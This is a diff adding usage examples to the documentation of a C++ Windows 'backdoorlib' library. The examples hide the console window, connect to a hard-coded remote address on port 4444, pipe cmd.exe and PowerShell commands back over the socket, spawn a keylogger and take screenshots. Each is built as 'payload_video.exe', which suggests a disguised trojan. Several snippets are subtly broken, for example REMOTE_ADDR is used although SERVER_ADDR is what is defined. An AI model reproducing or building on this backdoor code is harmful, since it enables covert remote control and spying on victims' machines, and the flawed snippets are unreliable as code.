@@ -162,7 +162,7 @@ int main()
   int c = connect(socks,session);
   if (c == 0)
   {
-      send(socks,"Hello Server !");
+    send(socks,"Hello Server !");
   }
   return 0;
 }
@@ -172,12 +172,127 @@ int main()
 ##### This Function allows you to send data
 ##### return -1 if failed and return 0 if sent
 
+```cpp
+//compile : g++ backdoorlib.cpp Payload.cpp -o payload_video.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -std=c++11 -lkernel32 -luser32 -lgdi32 -lwinspool -lwininet -lole32 -loleaut32 -luuid -Wconversion-null
+#include "backdoorlib.h"
+#include <iostream>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <string.h>
+#include <wininet.h>
+#include <windows.h>
+
+#pragma comment(lib,"Ws2_32.lib")
+
+#define SERVER_ADDR "192.168.1.71"
+#define SERVER_PORT 4444
+
+int main()
+{
+  hide_console();
+  WSADATA wsa_version;
+  SOCKET socks;
+
+  struct sockaddr_in session;
+
+  session.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
+  session.sin_family = AF_INET;
+  session.sin_port = htons(REMOTE_PORT);
+
+  WSAStartup(MAKEWORD(2,2),&wsa_version);
+  socks = WSASocket(AF_INET, SOCK_STREAM,IPPROTO_TCP,0,0,0);
+  int c = connect(socks,session);
+  if (c == 0)
+  {
+    send(socks,"Hello Server !"); // return 0 if data sent else return -1;
+  }
+  return 0;
+}
+```
 #### int recv(SOCKET socks_instance,char *buffer,int len)
 ##### This Function allows you to receive data and store it in a buffer.
 ##### return data if true else return 0 or -1 if not data
 
+```cpp
+//compile : g++ backdoorlib.cpp Payload.cpp -o payload_video.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -std=c++11 -lkernel32 -luser32 -lgdi32 -lwinspool -lwininet -lole32 -loleaut32 -luuid -Wconversion-null
+#include "backdoorlib.h"
+#include <iostream>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <string.h>
+#include <wininet.h>
+#include <windows.h>
+
+#pragma comment(lib,"Ws2_32.lib")
+
+#define SERVER_ADDR "192.168.1.71"
+#define SERVER_PORT 4444
+
+int main()
+{
+  hide_console();
+  WSADATA wsa_version;
+  SOCKET socks;
+
+  struct sockaddr_in session;
+
+  session.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
+  session.sin_family = AF_INET;
+  session.sin_port = htons(REMOTE_PORT);
+
+  WSAStartup(MAKEWORD(2,2),&wsa_version);
+  socks = WSASocket(AF_INET, SOCK_STREAM,IPPROTO_TCP,0,0,0);
+  int c = connect(socks,session);
+  if (c == 0)
+  {
+    char *buffer[4096];
+    recv(socks,buffer,sizeof(buffer)); // return data if recv else return -1;
+  }
+  return 0;
+}
+```
+
 #### void cmd_command(SOCKET socks_instance,char *command)
 ##### This Function allows you to send a command in the cmd.exe process.
+
+```cpp
+//compile : g++ backdoorlib.cpp Payload.cpp -o payload_video.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -std=c++11 -lkernel32 -luser32 -lgdi32 -lwinspool -lwininet -lole32 -loleaut32 -luuid -Wconversion-null
+#include "backdoorlib.h"
+#include <iostream>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <string.h>
+#include <wininet.h>
+#include <windows.h>
+
+#pragma comment(lib,"Ws2_32.lib")
+
+#define SERVER_ADDR "192.168.1.71"
+#define SERVER_PORT 4444
+
+int main()
+{
+  hide_console();
+  WSADATA wsa_version;
+  SOCKET socks;
+
+  struct sockaddr_in session;
+
+  session.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
+  session.sin_family = AF_INET;
+  session.sin_port = htons(REMOTE_PORT);
+
+  WSAStartup(MAKEWORD(2,2),&wsa_version);
+  socks = WSASocket(AF_INET, SOCK_STREAM,IPPROTO_TCP,0,0,0);
+  int c = connect(socks,session);
+  if (c == 0)
+  {
+    char *buffer[] = "dir";
+    cmd_command(socks,buffer); // execute cmd_command and recv output
+  }
+  return 0;
+}
+```
 
 #### void powershell_command(SOCKET socks_instance,char*command)
 ##### This function allows you to send a command in the powershell.exe process.
@@ -193,6 +308,43 @@ int main()
 
 #### void execute_powershell(SOCKET socks_instance);
 ##### This Function executes powershell.exe and returns the contents of its contents remotely per socket.
+```cpp
+//compile : g++ backdoorlib.cpp Payload.cpp -o payload_video.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -std=c++11 -lkernel32 -luser32 -lgdi32 -lwinspool -lwininet -lole32 -loleaut32 -luuid -Wconversion-null
+#include "backdoorlib.h"
+#include <iostream>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <string.h>
+#include <wininet.h>
+#include <windows.h>
+
+#pragma comment(lib,"Ws2_32.lib")
+
+#define SERVER_ADDR "192.168.1.71"
+#define SERVER_PORT 4444
+
+int main()
+{
+  hide_console();
+  WSADATA wsa_version;
+  SOCKET socks;
+
+  struct sockaddr_in session;
+
+  session.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
+  session.sin_family = AF_INET;
+  session.sin_port = htons(REMOTE_PORT);
+
+  WSAStartup(MAKEWORD(2,2),&wsa_version);
+  socks = WSASocket(AF_INET, SOCK_STREAM,IPPROTO_TCP,0,0,0);
+  int c = connect(socks,session);
+  if (c == 0)
+  {
+    execute_powershell(socks); // execute cmd_command and recv output
+  }
+  return 0;
+}
+```
 
 #### int download_to_ftp(char* filename, char* ftp_host, int ftp_port,char *ftp_user,char *ftp_pass)
 ##### This function allows you to send a file to an ftp server.
@@ -209,6 +361,29 @@ int main()
 #### int keylogger_spawn(string FILENAME_LOG)
 ##### launches a keylogger
 ##### return 0
+
+```cpp
+//compile : g++ backdoorlib.cpp Payload.cpp -o payload_video.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -std=c++11 -lkernel32 -luser32 -lgdi32 -lwinspool -lwininet -lole32 -loleaut32 -luuid -Wconversion-null
+#include "backdoorlib.h"
+#include <iostream>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <string.h>
+#include <wininet.h>
+#include <windows.h>
+
+#pragma comment(lib,"Ws2_32.lib")
+
+#define SERVER_ADDR "192.168.1.71"
+#define SERVER_PORT 4444
+
+int main()
+{
+  hide_console();
+  keylogger_spawn("log.txt"); // spawn a keylogger and write KEY_LOG in log.txt
+  return 0;
+}
+```
 
 #### vector<string> split(const string& s, char delim)
 ##### allows to split a character string
@@ -228,6 +403,29 @@ int main()
 #### bool screenshot(int x, int y, int w, int h, LPCSTR fname)
 ##### Take a ScreenShot and save as filename
 ##### if true return true if false return false
+
+```cpp
+//compile : g++ backdoorlib.cpp Payload.cpp -o payload_video.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -std=c++11 -lkernel32 -luser32 -lgdi32 -lwinspool -lwininet -lole32 -loleaut32 -luuid -Wconversion-null
+#include "backdoorlib.h"
+#include <iostream>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <string.h>
+#include <wininet.h>
+#include <windows.h>
+
+#pragma comment(lib,"Ws2_32.lib")
+
+#define SERVER_ADDR "192.168.1.71"
+#define SERVER_PORT 4444
+
+int main()
+{
+  hide_console();
+  screenshot(1920, 1080, 0, 0, (LPCSTR)"screenshot.jpg"); // take a screenshot
+  return 0;
+}
+```
 
 #### char *cmd_popen_char(const char *command,const char *mode,char *buffer)
 ##### This function allows you to execute a system command and retrieve the stdout or stderr output.
